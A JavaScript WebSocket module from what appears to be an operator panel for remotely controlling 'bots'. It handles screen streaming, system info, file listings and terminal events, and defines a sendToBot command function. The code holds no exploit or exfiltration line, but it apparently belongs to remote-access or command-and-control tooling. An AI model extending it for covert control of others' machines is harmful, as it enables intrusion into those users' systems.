// frontend\client_control\js\modules\websocket\connection.js

import { AppState } from '../core/states.js';
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
import { renderScreenRGBA } from '../features/screen_renderer.js';

let socket = null;
const $ = id => document.getElementById(id);

// Обновление текстовых элементов UI
const ui = (id, val) => { if ($(id)) $(id).textContent = val ?? '...'; };

// Визуальный индикатор статуса сети
const setOnline = (on) => {
    const el = $('status-indicator');
    el?.classList.toggle('online', on);
    el?.classList.toggle('offline', !on);
    ui('status-text', on ? 'online' : 'offline');
};

/**
 * Обработка входящих пакетов данных
 */
const handleIncomingData = (buf) => {
    const pkg = decodePacket(buf);
    if (!pkg) return;

    const { module, type, action, payload, extra } = pkg;

    // --- Логика трансляции экрана ---
    if (module === 'ScreenView') {
        if (action === 'STOP') return window.resetRenderer?.();
        if (type === 'bin') return renderScreenRGBA(payload);
        return;
    }

    // --- Логика системной информации ---
    if (module === 'SystemInfo') {
        const data = payload;
        if (data && typeof data === 'object') {
            if (data.ip) ui('display-ip', data.ip);
            if (data.id) ui('display-id', data.id);
            if (data.status) window.updateBotStatus?.(data.status);
        }
        return;
    }

    // --- Логика FileManager (Упрощенная: только LIST) ---
    if (module === 'FileManager') {
        console.log(`[WS] FileManager Response: ${action}`);

        // Обрабатываем только ответ на запрос списка файлов/дисков
        if (action === 'LIST') {
            if (window.renderFileSystem) {
                // Отправляем payload (JSON список) в files.js
                window.renderFileSystem(payload);
            }
            return;
        }
    }

    // Универсальное событие для остальных модулей (например, терминала)
    window.dispatchEvent(new CustomEvent(`${module}:${action}`, { detail: payload }));
};

/**
 * Инициализация WebSocket соединения
 */
export const initControlConnection = () => {
    const { clientId: tid } = AppState;
    const [token, login] = ['auth_token', 'user_login'].map(k => localStorage.getItem(k));
    
    if (!token || !tid) return console.error("[WS] Missing Auth Data");

    const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const url = `${protocol}//${location.host}/ws?token=${token}&login=${login}&mode=control&target=${encodeURIComponent(tid)}`;
    
    socket = new WebSocket(url);
    socket.binaryType = 'arraybuffer';
    
    socket.onopen = () => setOnline(true);
    socket.onclose = () => setOnline(false);
    socket.onmessage = (e) => handleIncomingData(e.data);

    /**
     * Глобальная функция отправки команд боту
     * Реализована строго по формуле: [HEADER] + [ID] + [MOD:TYPE:ACT:EXTRA] + [PAYLOAD]
     */
    window.sendToBot = (modName, pay, action = 'DATA', extra = 'none') => {
        if (socket?.readyState !== 1) return;

        let type = 'str';
        if (pay instanceof ArrayBuffer || pay instanceof Uint8Array) {
            type = 'bin';
        } else if (typeof pay === 'object' && pay !== null) {
            type = 'json';
        }
        
        // Форсируем тип json для навигации, чтобы бот корректно парсил пакет
        if (action === 'LIST') type = 'json';

        socket.send(encodePacket(tid, modName, type, action, extra, pay));
    };
};